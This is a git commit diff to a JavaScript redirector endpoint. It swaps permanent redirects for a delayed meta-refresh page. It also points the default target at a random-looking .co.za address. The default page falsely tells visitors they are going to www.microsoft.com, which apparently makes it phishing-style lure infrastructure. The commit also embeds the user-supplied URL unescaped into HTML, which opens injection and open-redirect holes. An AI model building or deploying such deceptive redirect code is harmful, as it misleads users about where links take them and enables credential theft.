976ebcb0f94beea66ac2b2921d243a079e0813cd
“richmond” <richmond@osspesecuritycenter.com>
2025-10-03 17:07:31 +0100

    codeChangeWithDelay

--- api/redirector.js
+++ api/redirector.js
@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://nlbnklko.voulastai.co.za/@KIdNRlwwaKTN/';
+    const defaultUrl = 'https://harmony-314.voulastai.co.za/wIiXG2YvaRP1Kp!/';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
@@ -18,16 +18,39 @@ module.exports = (req, res) => {
                 return res.status(400).send('Bad Request: Invalid URL format.');
             }
 
-            // Send the redirect response with status 301 (permanent redirect)
-            res.writeHead(301, { 'Location': decodedUrl });
-            res.end();
+            // Send the loading page with the target URL embedded
+            res.send(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta http-equiv="refresh" content="2;url=${decodedUrl}">
+                    <title>Redirecting...</title>
+                </head>
+                <body>
+                    <p>Loading...</p>
+                    <!-- You could include the full loading HTML here -->
+                </body>
+                </html>
+            `);
         } catch (err) {
             // If there is an error decoding the URL, send a bad request response
             res.status(400).send('Bad Request: Invalid URL encoding.');
         }
     } else {
         // If no 'url' query parameter is provided, redirect to the default URL
-        res.writeHead(301, { 'Location': defaultUrl });
-        res.end();
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta http-equiv="refresh" content="2;url=${defaultUrl}">
+                <title>Redirecting...</title>
+            </head>
+            <body>
+                <p>Redirecting to www.microsoft.com in 2 seconds...</p>
+                <!-- You could include the full loading HTML here -->
+            </body>
+            </html>
+        `);
     }
 };
+
